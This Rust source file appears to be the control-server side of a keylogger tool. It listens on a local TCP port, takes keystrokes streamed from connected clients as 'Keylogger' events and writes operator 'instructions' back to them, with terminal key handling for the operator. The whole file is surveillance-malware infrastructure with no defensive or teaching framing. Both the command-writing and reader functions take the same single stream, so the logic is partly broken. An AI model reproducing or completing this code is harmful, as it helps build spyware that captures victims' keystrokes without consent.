use std::io::prelude::*;
use std::net::{TcpListener, TcpStream};
use std::sync::mpsc;
use std::thread;
use std::sync::{Arc, Mutex};

use crate::app::AppEvent;
use crossterm::event::{self};

#[derive(Debug)]
pub struct Core {
    pub stream: Arc<Mutex<Option<TcpStream>>>,
    pub sender: mpsc::Sender<AppEvent>,
    pub receiver: mpsc::Receiver<AppEvent>,
}

impl Core {
    pub fn new() -> Self {
        let stream = Arc::new(Mutex::new(None));
        let (sender, receiver) = mpsc::channel::<AppEvent>();
        
        Core {
            stream,
            sender,
            receiver,
        }
    }

    pub fn start_tcp_listener(&self) {
        let sender = self.sender.clone();
        thread::spawn(move || {
            let listener = TcpListener::bind("127.0.0.1:7878").expect("Cannot bind port");
            for stream in listener.incoming() {
                if let Ok(stream) = stream {
                    if let Ok(addr) = stream.peer_addr() {
                        if sender.send(AppEvent::ClientConnected(stream, addr)).is_err() {
                            break;
                        }
                    }
                }
            }
        });
    }

    pub fn apply_instructions(&mut self, input: String) -> Result<(), std::io::Error> {
        let stream = {
            let mut stream_guard = self.stream.lock().unwrap();
            stream_guard.take()
        };

        if let Some(mut stream) = stream {
            stream.write_all(input.as_bytes())?;
            stream.flush()?;
        }
        
        Ok(())
    }

    pub fn start_client_reader(&mut self) {
        let stream = {  
            let mut stream_guard = self.stream.lock().unwrap();
            stream_guard.take()
        };
        
        let sender = self.sender.clone();
        thread::spawn(move || {
            let mut buffer = [0; 512];

            let Some(mut stream) = stream else {
                return;
            };

            while let Ok(bytes) = stream.read(&mut buffer[..]) { 
                if bytes == 0 { break; }

                if let Ok(key) = std::str::from_utf8(&buffer[..bytes]) {
                    if sender.send(AppEvent::Keylogger(key.to_string())).is_err() {
                        break;
                    }
                }
            }
        });
    }

    pub fn start_terminal_key_events(&mut self) {
        let sender = self.sender.clone();
        thread::spawn(move || {
            while let Ok(event) = event::read() {
                if let Some(key) = event.as_key_press_event() {
                    if sender.send(AppEvent::Terminal(key)).is_err() {
                        break;
                    }
                }
            }
        });
    }
}
